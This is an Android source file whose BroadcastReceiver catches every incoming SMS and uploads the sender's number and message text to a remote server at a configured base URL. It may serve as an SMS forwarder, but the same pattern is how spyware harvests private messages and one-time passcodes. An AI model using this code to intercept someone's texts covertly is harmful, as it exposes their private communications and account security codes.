package com.aven.sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import com.aven.sms.api.PostApi;

import java.text.SimpleDateFormat;
import java.util.Date;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;

public class MyReceiver extends BroadcastReceiver {
    public Context context;
    @Override
    public void onReceive(Context context, Intent intent) {
        this.context = context;
        Bundle bundle = intent.getExtras();
        SmsMessage msg = null;
        String mess = "";
        Log.i("aven","---------MyReceiver start");
        if (null != bundle) {
            Object[] smsObj = (Object[]) bundle.get("pdus");
            Log.i("aven","---------MyReceiver 22");
            for (Object object : smsObj) {
                msg = SmsMessage.createFromPdu((byte[]) object);
                Date date = new Date(msg.getTimestampMillis());//时间
                SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                String receiveTime = format.format(date);

                mess += msg.getDisplayMessageBody();

            }
        }
        initHttp( msg.getOriginatingAddress(),mess);

    }

    public void initHttp(String phone,String message){
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(App.BASE_URL)
                .build();
        PostApi api = retrofit.create(PostApi.class);
        Call<ResponseBody> call = api.postData(phone,message);
        call.enqueue(new Callback<ResponseBody>() {
            @Override
            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                Log.i("aven","---3"+response.toString());
            }

            @Override
            public void onFailure(Call<ResponseBody> call, Throwable t) {
                Toast.makeText(context,"failuer",Toast.LENGTH_LONG).show();
                t.printStackTrace();
            }
        });
    }
}

